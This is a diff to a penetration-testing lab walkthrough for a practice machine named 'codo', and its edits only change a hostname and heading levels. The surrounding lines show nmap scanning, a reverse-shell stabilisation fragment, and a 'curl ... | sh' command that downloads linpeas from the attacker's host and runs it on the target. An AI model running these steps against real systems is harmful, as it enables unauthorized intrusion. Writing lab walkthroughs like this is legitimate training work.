@@ -30,7 +30,7 @@ nmap -p- --open -sC -sV codo.offsec
 ![nmap](./nmap.png)
 
 The nmap scan discovered a web application
-- Browse to `http://codo/` and we can see that the website is `Powered by Codoforum`
+- Browse to `http://codo.offsec/` and we can see that the website is `Powered by Codoforum`
 
 ## Gobuster
 ```
@@ -85,7 +85,7 @@ stty raw -echo ; fg
 reset
 ```
 
-## Privilege Escalation
+# Privilege Escalation
 To assess the attack surface, run `linpeas.sh` on the target:
 - run a python http server in the directory with the `linpeas.sh` file with `python3 -m http.server 80`
 - then use the `curl` command with `sh` to run the script on the target machine
@@ -94,7 +94,7 @@ To assess the attack surface, run `linpeas.sh` on the target:
 curl http://192.168.45.202/linpeas.sh | sh
 ```
 
-### Linpeas Results
+## Linpeas Results
 From the scan results, we find a config PHP file with a password in it.
 ![foundPass](./foundPass.png)
 
